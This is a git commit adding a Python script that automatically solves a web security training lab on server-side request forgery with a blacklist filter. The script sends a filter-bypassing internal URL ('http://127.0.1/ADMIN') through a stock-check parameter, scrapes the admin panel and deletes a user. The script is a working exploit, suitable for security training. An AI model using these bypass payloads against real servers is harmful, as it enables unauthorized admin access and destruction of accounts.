d7bdb0a990aa0c5c632a8cb3016a3dd26d339b08
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-01-03 18:55:10 -0800

    SSRF with blacklist-based input filter

---
+++ web-security/ssrf/lab-ssrf-with-blacklist-filter.py
@@ -0,0 +1,37 @@
+from ..utils import *
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+import requests
+
+
+def solve_lab(url, proxies):
+    url = urljoin(url, "/product/stock")
+    data = {"stockApi": "http://127.0.1/ADMIN"}
+
+    print_info(
+        f'Performing an SSRF attack by sending a POST request to "{url}" with the following data:'
+    )
+    print(f"{data}")
+
+    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    print_success("POST request sent successfully.\n")
+
+    print_info("Using the response to find URL to delete the user carlos...")
+    soup = BeautifulSoup(resp.text, "html.parser")
+    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
+
+    if tag is None:
+        print_fail("Unable to find URL.")
+    else:
+        ssrf = urljoin("http://127.0.1/", tag.get("href").replace("admin", "ADMIN"))
+        print_success(f"Found URL: {ssrf}\n")
+
+    data = {"stockApi": ssrf}
+    print_info(
+        f'Deleting the user carlos by sending a POST request to "{url}" with the following data:'
+    )
+    print(f"{data}")
+
+    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    print_success("POST request sent successfully.\n")
